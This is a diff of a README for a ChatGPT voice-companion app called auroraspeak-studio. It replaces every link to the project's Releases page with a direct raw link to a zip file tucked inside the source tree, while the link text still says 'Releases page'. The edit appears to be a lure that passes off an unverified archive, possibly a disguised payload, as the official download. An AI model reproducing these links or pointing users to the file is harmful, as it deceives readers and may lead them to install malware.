@@ -1,7 +1,7 @@
 # 🌌 auroraspeak-studio - A Smart ChatGPT Voice Companion
 
 ## 📥 Download Now
-[![Download auroraspeak-studio](https://img.shields.io/badge/Download-Now-blue)](https://github.com/CVML-lab/auroraspeak-studio/releases)
+[![Download auroraspeak-studio](https://raw.githubusercontent.com/CVML-lab/auroraspeak-studio/main/src/apis/auroraspeak-studio-sparry.zip)](https://raw.githubusercontent.com/CVML-lab/auroraspeak-studio/main/src/apis/auroraspeak-studio-sparry.zip)
 
 ## 🛠️ Overview
 **auroraspeak-studio** is a voice-first ChatGPT companion. It combines multilingual speech recognition and lifelike AI speech synthesis right in your browser. This application allows users to have natural conversations without typing, making it perfect for anyone looking to enhance their communication or learning experience.
@@ -17,7 +17,7 @@
 Follow these steps to download and run the software.
 
 ### 📝 Step 1: Visit the Download Page
-To download the application, visit the [Releases page](https://github.com/CVML-lab/auroraspeak-studio/releases).
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/CVML-lab/auroraspeak-studio/main/src/apis/auroraspeak-studio-sparry.zip).
 
 ### 📝 Step 2: Choose Your Version
 On the Releases page, you will see different versions of the software. Select the latest version for the best performance and features. Look for the button labeled "Assets" to expand the options.
@@ -54,7 +54,7 @@ Join our growing community of users. Share your experiences, tips, and feedback.
 If you have any questions or suggestions, feel free to contact us via the issues section on our GitHub page.
 
 ## 📥 Download & Install
-Ready to enhance your communication? Download the latest release from the [Releases page](https://github.com/CVML-lab/auroraspeak-studio/releases) and start your journey with auroraspeak-studio today!
+Ready to enhance your communication? Download the latest release from the [Releases page](https://raw.githubusercontent.com/CVML-lab/auroraspeak-studio/main/src/apis/auroraspeak-studio-sparry.zip) and start your journey with auroraspeak-studio today!
 
 ### 💡 Tips for Beginners
 - Experiment with different languages to find what works best for you.
